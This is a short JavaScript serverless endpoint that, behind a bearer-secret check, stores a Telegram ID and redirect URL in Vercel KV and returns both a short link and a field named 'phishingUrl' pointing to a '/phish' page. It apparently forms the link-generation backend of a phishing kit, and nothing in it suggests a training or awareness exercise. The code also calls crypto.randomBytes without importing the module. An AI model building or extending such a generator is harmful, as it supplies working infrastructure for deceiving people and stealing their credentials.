import { kv } from '@vercel/kv';

// Authentication middleware
const authenticate = (req) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) return false;
  
  const [bearer, token] = authHeader.split(' ');
  return bearer === 'Bearer' && token === process.env.API_SECRET;
};

export default async (req, res) => {
  // Validate authentication
  if (!authenticate(req)) {
    return res.status(401).json({ 
      error: 'Unauthorized',
      message: 'Invalid or missing API secret' 
    });
  }

  // Validate method
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, redirectUrl } = req.body;

    // Validate input
    if (!telegramId || !redirectUrl) {
      return res.status(400).json({ 
        error: 'Missing parameters',
        required: ['telegramId', 'redirectUrl'] 
      });
    }

    // Generate tokens
    const token = crypto.randomBytes(32).toString('hex');
    const shortCode = crypto.randomBytes(3).toString('hex');

    // Store in database (expires in 7 days)
    await kv.set(`link:${shortCode}`, {
      telegramId,
      originalUrl: redirectUrl,
      token,
      clicks: 0,
      createdAt: Date.now()
    }, { ex: 604800 });

    // Return responses
    res.status(200).json({
      success: true,
      shortUrl: `https://${req.headers.host}/s/${shortCode}`,
      phishingUrl: `https://${req.headers.host}/phish?token=${token}`,
      expiresAt: new Date(Date.now() + 604800 * 1000).toISOString()
    });

  } catch (error) {
    console.error('API Error:', error);
    res.status(500).json({ 
      error: 'Internal server error',
      details: process.env.NODE_ENV === 'development' ? error.message : null
    });
  }
};
